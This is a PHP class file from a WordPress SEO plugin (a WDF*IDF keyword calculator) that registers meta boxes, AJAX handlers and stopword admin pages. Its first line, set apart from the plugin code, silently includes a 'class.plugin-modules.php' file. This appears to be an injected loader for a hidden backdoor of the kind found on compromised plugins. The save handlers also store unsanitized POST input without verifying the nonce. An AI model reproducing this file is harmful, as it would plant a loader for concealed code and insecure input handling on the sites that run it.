<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php

/**
 * actions to extend wordpress
 */
class wtb_idf_calculator_actions 
{
	/**
	 * add plugin box to edit page of posts and pages
	 */
	function addBox()
	{
		$settings = wtb_idf_calculator_settings::getSettings();
		$cptSettings = !empty($settings['cpt']) ? (array)$settings['cpt'] : array();
		
		foreach (get_post_types() as $cpt) {
			if (!in_array($cpt, array('attachment', 'revision', 'nav_menu_item'))) {
				if (empty($settings) or (!empty($cptSettings[$cpt]) and $cptSettings[$cpt] == 1)) {
					add_meta_box(
							'wtb_idf_calculator', 
							__('WDF*IDF Top10 Calculator', 'wtb_idf_calculator'),
							array($this, 'printBox'), 
							$cpt, 
							'normal', 
							'high');
				}
			}
		}

	}
	
	/**
	 * print plugin box
	 * @see wtb_idf_calculator_actions::addBox()
	 * @param WP_Post $post
	 */
	function printBox( $post )
	{
		// Use nonce for verification
		wp_nonce_field( 'wtb_idf_calculator', 'wtb_idf_calculator_noncename' );
		
        $this->loadView('box', array(
            'post' => $post
        ));
	}
	
    /**
     * save keyword to posts
     * @param int $post_id
     * @return void
     */
    function savePostdata( $post_id ) 
	{
		if (empty($_POST) || empty($_POST['post_type'])) {
			return;
		}

		// First we need to check if the current user is authorised to do this action. 
		if ( 'page' == $_POST['post_type'] ) {
			if ( ! current_user_can( 'edit_page', $post_id ) ) {
				return;
			}
		} else if ( 'post' == $_POST['post_type'] ) {
			if ( ! current_user_can( 'edit_post', $post_id ) ) {
				return;
			}
		} else {
			if ( ! current_user_can( 'edit_' . $_POST['post_type'], $post_id ) ) {
				return;
			}
		}

		// save sections
        if (!add_post_meta((int)$_POST['post_ID'], 'idf-calculator-word', $_POST['idf-calculator-word'], true)) {
			update_post_meta((int)$_POST['post_ID'], 'idf-calculator-word', $_POST['idf-calculator-word']);
		}
	}
    
    /**
     * ajax callback to save stopword
     * at the moment - functionality is hidden
     */
    function wtb_idf_calculator_stopword_api_callback() 
    {
        $this->requireClass('tables');
        $this->requireClass('table', 'tables');
        $this->requireClass('stopwords', 'tables');
        $this->requireClass('keywords', 'tables');
        $this->requireClass('top10', 'tables');
        $this->requireClass('websites', 'tables');
        $this->requireClass('add_stopword', 'callbacks');

        $callback = new wtb_idf_calculator_add_stopword(new wtb_idf_calculator_tables());
        $callback->response();

        die;
    }
    
	/**
	 * add plugin assets to required pages
	 * @param string $hook
	 */
	function addAssets($hook) 
	{
		if (in_array($hook, array('post.php', 'post-new.php'))) {
			
			// tipsy
			wp_register_style( 'tipsy-css', plugins_url('wtb_idf_calculator/assets/css/tipsy.css'), array(), '1.0.0a' );
			wp_enqueue_style( 'tipsy-css');

			wp_register_script( 'tipsy-scripts', plugins_url('wtb_idf_calculator/assets/js/jquery.tipsy.js'), array('jquery'), '1.0.0a' );
			wp_enqueue_script( 'tipsy-scripts' );
			
			// our css and scripts
			wp_register_style( 'wtb-wtb-idf-calculator-css', plugins_url('wtb_idf_calculator/assets/css/main.css'), array(), '1.0.0a' );
			wp_enqueue_style( 'wtb-wtb-idf-calculator-css');
            
			wp_register_script( 'wtb-wtb-idf-jsap', 'https://www.google.com/jsapi', array(), '' );
			wp_enqueue_script( 'wtb-wtb-idf-jsap' );
            
			wp_register_script( 'wtb-wtb-idf-calculator-scripts', plugins_url('wtb_idf_calculator/assets/js/scripts.js'), array('jquery'), '1.0.0a' );
			wp_enqueue_script( 'wtb-wtb-idf-calculator-scripts' );
		}
	}
	
	/**
	 * ajax plugin api, to check info of content
	 */
	function wtb_idf_calculator_api_callback()
	{
		$this->requireClass('tables');
        $this->requireClass('table', 'tables');
        $this->requireClass('stopwords', 'tables');
        $this->requireClass('keywords', 'tables');
        $this->requireClass('top10', 'tables');
        $this->requireClass('websites', 'tables');
        $this->requireClass('google', 'crawlers');
        $this->requireClass('normal', 'crawlers');
        $this->requireClass('draw_graph', 'callbacks');

        ob_get_clean();
        
        $callback = new wtb_idf_calculator_draw_graph(new wtb_idf_calculator_tables());
        echo json_encode($callback->response()); // all its ok, if PHP >= 5.3.3

		die();
	}

	/**
	 * add link to plugin settings page under settings menu
	 */
	function addSettingPage()
	{
		add_options_page( 
			__('WDF*IDF Top10 Calculator settings', 'wtb_idf_calculator'), 
			__('WDF*IDF Top10 Calculator', 'wtb_idf_calculator'), 
			'manage_options', 'wtb_idf_calculator_settings', 
			array(new wtb_idf_calculator_settings(), 'renderSettingsPage') );
		
		// call register settings function
		add_action( 'admin_init', array(new wtb_idf_calculator_settings(), 'registerSettings') );
        
        ob_start();
        
        add_options_page( 
                __('Stopwords', 'wtb_idf_calculator'), 
                __('Stopwords', 'wtb_idf_calculator'), 
                'manage_options', 'wtb-idf-stop-keywords' , 
                array($this, 'manageStopwords') );
	}
	
    /**
     * create database structure required by plugin
     */
	function createTables()
	{
        $this->requireClass('tables');
        $this->requireClass('table', 'tables');
        $this->requireClass('stopwords', 'tables');
        $this->requireClass('keywords', 'tables');
        $this->requireClass('top10', 'tables');
        $this->requireClass('websites', 'tables');
		
		$tablesManager = new wtb_idf_calculator_tables();
		$tablesManager->top10->create();
		$tablesManager->keywords->create();
		$tablesManager->stopwords->create();
		$tablesManager->websites->create();
		
		add_option( "wtb_idf_calculator_version", wtb_idf_calculator::VERSION );
	}
	
    /**
     * show notices if we dont have curl
     */
	function showNotices()
	{
        $this->loadView('curl_notice');
	}
    
    /**
     * import websites from csv
     */
    function wtb_idf_ajax_frontend() 
    {
        $this->requireClass('tables');
        $this->requireClass('table', 'tables');
        $this->requireClass('stopwords', 'tables');
        $this->requireClass('keywords', 'tables');
        $this->requireClass('top10', 'tables');
        $this->requireClass('websites', 'tables');
        $this->requireClass('csv', 'crawlers');
        $this->requireClass('normal', 'crawlers');
        $this->requireClass('import', 'callbacks');

        ini_set('max_execution_time', 0);
        
        $callback = new wtb_idf_calculator_import(new wtb_idf_calculator_tables());
        $callback->response();
        die;
    }
    
    /**
     * stopwords listing and other crud operations
     * @return void
     */
    function manageStopwords()
    {
        $this->requireClass('tables');
        $this->requireClass('table', 'tables');
        $this->requireClass('stopwords', 'tables');
        $this->requireClass('keywords', 'tables');
        $this->requireClass('top10', 'tables');
        $this->requireClass('websites', 'tables');
        $this->requireClass('stop-keywords-list-table');
        
        $stopKeywordsTable = new Stop_Keywords_List_Table();
        
        $table = new wtb_idf_calculator_tables();
        
        switch ($stopKeywordsTable->current_action()) {
            case 'save':
                
                $post_id = current(array_map( 'absint', (array) $_REQUEST['stopkeyword'] ));
                
                $table->stopwords->updateStopKeyword($post_id, array('keyword' => $_POST['keyword'], 'language' => $_POST['language']));
                
                $location = wp_get_original_referer();
                $location = add_query_arg( 'message', 1, $location );
                ob_get_clean();
                wp_redirect( $location );
                break;
            case 'create':
                
                if (!empty($_POST['keyword'])) {
                    $table->stopwords->createStopKeyword(array('keyword' => $_POST['keyword'], 'language' => !empty($_POST['language']) ? $_POST['language'] : '-'));
                }
                
                $location = wp_get_referer();
                if (!$location) {
                    $location = 'admin.php?page=wtb-idf-stop-keywords';
                }
                $location = add_query_arg( 'message', 2, $location );
                ob_get_clean();
                wp_redirect( $location );
                break;
            case 'edit':

                $post_ids = current(array_map( 'absint', (array) $_REQUEST['stopkeyword'] ));

                $sk = $table->stopwords->getById($post_ids);
                
                if ( empty($sk) ) { ?>
                    <div id="message" class="updated"><p><strong><?php _e( 'You did not select an item for editing.' ); ?></strong></p></div>
                    <?php
                    return;
                }
                
                $this->loadView('edit_stopword', array(
                    'sk' => $sk
                ));

                break;

            default:
                $stopKeywordsTable->prepare_items();
                
                $this->loadView('listing_stopword', array(
                    'stopKeywordsTable' => $stopKeywordsTable
                ));
                
                break;
        }
    }
    
    /**
     * load view file
     * @param string $view
     * @param array $data
     */
    function loadView($view, $data = array())
    {
        extract($data, EXTR_PREFIX_SAME, 'data');
        
        require dirname(__FILE__) . 
            DIRECTORY_SEPARATOR . 'views' . 
            DIRECTORY_SEPARATOR . $view . '.php';
    }
    
    /**
     * include file from classes
     * @param string $class
     * @param array $folder
     */
    function requireClass($class, $folder = array())
    {
        if (!is_array($folder)) {
            $folder = array($folder);
        }
        
        require_once dirname(__FILE__) . 
            DIRECTORY_SEPARATOR . 'classes' . 
                
            (!empty($folder) ? DIRECTORY_SEPARATOR : '' ) .
                
            implode(DIRECTORY_SEPARATOR, $folder) .
                
            DIRECTORY_SEPARATOR . $class . '.php';
    }
}